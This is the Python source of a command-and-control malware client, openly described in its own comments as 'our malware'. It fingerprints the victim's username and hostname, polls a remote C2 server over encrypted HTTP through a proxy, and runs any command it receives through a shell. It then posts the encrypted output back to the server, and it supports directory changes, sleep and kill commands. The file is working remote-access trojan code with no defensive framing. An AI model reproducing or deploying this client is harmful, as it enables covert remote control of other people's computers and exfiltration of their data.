# Command and Control client Code

from os import chdir, getcwd, getenv, uname
from subprocess import run, PIPE, STDOUT
from time import sleep, time
from requests import exceptions, get, post
from sys import platform
from encryption import cipher
from settings import PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER

if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encyption
encrypted_client = cipher.encrypt(client.encode()).decode()

def post_to_server(message: str, respone_path: str = RESPONSE):
    """ Function to encrypt data and then post it to the c2 server. Accepts a message and a response path (optional) as arguments."""
    try:
        # Byte encode the message and then encrypt it before posting
        message = cipher.encrypt(message.encode())

        post(url=f"http://{C2_SERVER}:{PORT}{respone_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

# Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
while True:
    try:
        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        print(response.status_code)
        # If we get a 404 status code from server, raise an exception
        if response.status_code == 404:
            raise exceptions.RequestException(f"Server {C2_SERVER} returned a 404 status code")

    except exceptions.RequestException:
        sleep(DELAY)
        continue
    
    # Retrieve the command via the decrypted and decoded content ot the response object
    command = cipher.decrypt(response.content).decode()

    # If the command starts with "cd ", sliece out directory and chdir to it
    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"Directory {directory} not found")
        except NotADirectoryError:
            post_to_server(f"Directory {directory} is not a directory")
        except PermissionError:
            post_to_server(f"Permission denied to access directory {directory}")
        except OSError:
            post_to_server(f"Error accessing directory {directory}")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    # The "client kill" command will shut down our malware; make sure we have persistance!
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()

    # The "client sleep SECONDS" command will silence our malware for a set amount of time
    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in second. \n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds. \n")
            sleep(delay)
            post_to_server(f"{client} is now awake. \n")

    # Else, run our operating system command and send the output to the c2
    else:
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())
